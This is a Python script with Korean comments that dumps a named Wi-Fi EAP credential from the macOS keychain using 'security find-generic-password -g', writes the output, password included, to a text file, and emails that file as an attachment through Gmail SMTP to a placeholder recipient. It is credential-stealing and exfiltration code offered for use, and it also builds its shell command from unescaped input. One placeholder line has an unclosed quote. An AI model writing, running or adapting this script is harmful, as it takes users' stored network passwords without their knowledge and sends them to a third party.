import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def dump_keychain(service, output_file="keychain_dump.txt", timeout=60):
    """
    키체인 덤프의 전체 출력 결과를 텍스트 파일로 저장
    - service: 서비스 이름
    - output_file: 저장할 텍스트 파일 이름
    - timeout: 명령어 실행 타임아웃 (초)
    """
    try:
        # security 명령어 실행
        cmd = f"/usr/bin/security find-generic-password -g -s '{service}'"
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)

        # 명령어의 전체 출력 결과
        output = process.stdout + process.stderr

        if "could not be found" in output:
            print(f"Service '{service}' not found in keychain.")
            return None

        # 결과를 텍스트 파일로 저장
        with open(output_file, "w") as file:
            file.write(output)

        print(f"Keychain dump saved to {output_file}.")
        return output_file

    except subprocess.TimeoutExpired:
        print(f"Operation timed out after {timeout} seconds.")
        return None


def send_email(smtp_server, smtp_port, sender_email, sender_password, recipient_email, subject, body, attachment):
    """
    이메일을 텍스트 파일 첨부 형태로 전송
    - smtp_server: SMTP 서버 주소
    - smtp_port: SMTP 포트
    - sender_email: 발신 이메일 주소
    - sender_password: 발신 이메일 비밀번호
    - recipient_email: 수신 이메일 주소
    - subject: 이메일 제목
    - body: 이메일 본문
    - attachment: 첨부할 파일 경로
    """
    try:
        # 이메일 메시지 구성
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject

        # 이메일 본문
        msg.attach(MIMEText(body, 'plain'))

        # 파일 첨부
        with open(attachment, "rb") as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={attachment}',
            )
            msg.attach(part)

        # SMTP 서버 연결 및 이메일 전송
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)

        print(f"Email sent to {recipient_email}.")
    except Exception as e:
        print(f"Failed to send email: {e}")


if __name__ == "__main__":
    # Step 1: 서비스 이름 및 키체인 덤프 저장
    service_name = "com.apple.network.eap.user.item.wlan.ssid.nol-universe_wifi"
    output_file = "keychain_dump.txt"
    print(f"Fetching keychain dump for service: {service_name}...")
    dump_file = dump_keychain(service_name, output_file)

    if dump_file:
        # Step 2: SMTP 설정
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        sender_email = "발신 메일 주소  # 발신 이메일 주소
        sender_password = "gmail App PW"  # 생성한 애플리케이션 전용 비밀번호
        recipient_email = "수신 메일 주소"  # 수신 이메일 주소

        # Step 3: 이메일 전송
        subject = "Keychain Dump Output"
        body = "Attached is the keychain dump output for the requested service."
        send_email(smtp_server, smtp_port, sender_email, sender_password, recipient_email, subject, body, dump_file)
    else:
        print("Keychain dump failed or no data found.")
